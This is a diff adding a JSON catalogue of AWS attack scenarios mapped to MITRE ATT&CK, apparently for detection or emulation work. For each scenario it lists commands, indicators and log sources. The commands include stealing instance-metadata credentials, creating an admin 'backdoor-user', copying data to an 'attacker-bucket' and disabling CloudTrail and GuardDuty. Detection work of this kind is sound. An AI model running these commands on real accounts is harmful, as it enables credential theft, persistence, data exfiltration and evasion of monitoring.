@@ -1,0 +1,144 @@
+{
+  "aws_attack_scenarios": [
+    {
+      "name": "AWS_Credential_Access_T1552",
+      "technique": "T1552.005",
+      "tactic": "Credential Access",
+      "description": "Accessing AWS credentials from cloud instance metadata",
+      "platform": "AWS",
+      "real_commands": [
+        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
+        "aws sts get-caller-identity",
+        "aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)"
+      ],
+      "indicators": [
+        "Metadata service access from EC2 instance",
+        "AWS CLI credential enumeration",
+        "IAM policy enumeration"
+      ],
+      "log_sources": ["CloudTrail", "VPC Flow Logs", "Instance Logs"]
+    },
+    {
+      "name": "AWS_Discovery_T1580",
+      "technique": "T1580",
+      "tactic": "Discovery", 
+      "description": "Cloud infrastructure discovery and enumeration",
+      "platform": "AWS",
+      "real_commands": [
+        "aws ec2 describe-instances",
+        "aws s3 ls",
+        "aws iam list-users",
+        "aws iam list-roles",
+        "aws ec2 describe-security-groups",
+        "aws rds describe-db-instances",
+        "aws lambda list-functions",
+        "aws ecs list-clusters"
+      ],
+      "indicators": [
+        "Extensive AWS API enumeration",
+        "Resource discovery across multiple services",
+        "IAM entity enumeration"
+      ],
+      "log_sources": ["CloudTrail", "AWS Config", "GuardDuty"]
+    },
+    {
+      "name": "AWS_Privilege_Escalation_T1484",
+      "technique": "T1484.002",
+      "tactic": "Privilege Escalation",
+      "description": "AWS IAM privilege escalation through policy manipulation",
+      "platform": "AWS",
+      "real_commands": [
+        "aws iam create-policy --policy-name EscalationPolicy --policy-document file://escalation-policy.json",
+        "aws iam attach-user-policy --user-name target-user --policy-arn arn:aws:iam::account:policy/EscalationPolicy",
+        "aws iam create-role --role-name EscalationRole --assume-role-policy-document file://trust-policy.json",
+        "aws sts assume-role --role-arn arn:aws:iam::account:role/EscalationRole --role-session-name escalation-session"
+      ],
+      "indicators": [
+        "New IAM policy creation",
+        "Policy attachment to users/roles",
+        "Role assumption activities"
+      ],
+      "log_sources": ["CloudTrail", "IAM Access Analyzer", "AWS Config"]
+    },
+    {
+      "name": "AWS_Persistence_T1098",
+      "technique": "T1098.001",
+      "tactic": "Persistence",
+      "description": "Creating backdoor access through IAM manipulation",
+      "platform": "AWS",
+      "real_commands": [
+        "aws iam create-user --user-name backdoor-user",
+        "aws iam create-access-key --user-name backdoor-user",
+        "aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "aws iam create-login-profile --user-name backdoor-user --password TempPassword123!"
+      ],
+      "indicators": [
+        "New IAM user creation",
+        "Access key generation",
+        "Administrative policy attachment",
+        "Console access enablement"
+      ],
+      "log_sources": ["CloudTrail", "IAM Access Analyzer", "GuardDuty"]
+    },
+    {
+      "name": "AWS_Data_Exfiltration_T1537",
+      "technique": "T1537",
+      "tactic": "Exfiltration",
+      "description": "Data exfiltration from AWS S3 buckets",
+      "platform": "AWS",
+      "real_commands": [
+        "aws s3 ls s3://target-bucket --recursive",
+        "aws s3 cp s3://target-bucket/sensitive-data.txt ./",
+        "aws s3 sync s3://target-bucket ./local-copy/",
+        "aws s3 cp ./exfiltrated-data.zip s3://attacker-bucket/"
+      ],
+      "indicators": [
+        "Large S3 data transfers",
+        "Cross-account S3 access",
+        "Unusual download patterns"
+      ],
+      "log_sources": ["CloudTrail", "S3 Access Logs", "VPC Flow Logs"]
+    },
+    {
+      "name": "AWS_Defense_Evasion_T1562",
+      "technique": "T1562.008",
+      "tactic": "Defense Evasion",
+      "description": "Disabling AWS security services and logging",
+      "platform": "AWS",
+      "real_commands": [
+        "aws cloudtrail stop-logging --name security-trail",
+        "aws guardduty delete-detector --detector-id detector-id",
+        "aws config delete-configuration-recorder --configuration-recorder-name default",
+        "aws logs delete-log-group --log-group-name /aws/lambda/security-function"
+      ],
+      "indicators": [
+        "CloudTrail logging disabled",
+        "GuardDuty detector deletion",
+        "Config recorder removal",
+        "Security log group deletion"
+      ],
+      "log_sources": ["CloudTrail", "AWS Config", "GuardDuty"]
+    },
+    {
+      "name": "AWS_Lateral_Movement_T1021",
+      "technique": "T1021.007",
+      "tactic": "Lateral Movement",
+      "description": "Lateral movement through AWS services",
+      "platform": "AWS",
+      "real_commands": [
+        "aws ssm start-session --target i-1234567890abcdef0",
+        "aws ecs execute-command --cluster target-cluster --task target-task --container target-container --interactive --command '/bin/bash'",
+        "aws lambda invoke --function-name target-function --payload '{\"command\":\"whoami\"}' response.json",
+        "aws rds-data execute-statement --resource-arn arn:aws:rds:region:account:cluster:cluster-name --database target-db --sql 'SELECT * FROM users;'"
+      ],
+      "indicators": [
+        "SSM session establishment",
+        "ECS command execution",
+        "Lambda function invocation",
+        "RDS data API usage"
+      ],
+      "log_sources": ["CloudTrail", "SSM Session Manager", "ECS Logs", "Lambda Logs"]
+    }
+  ]
+} 
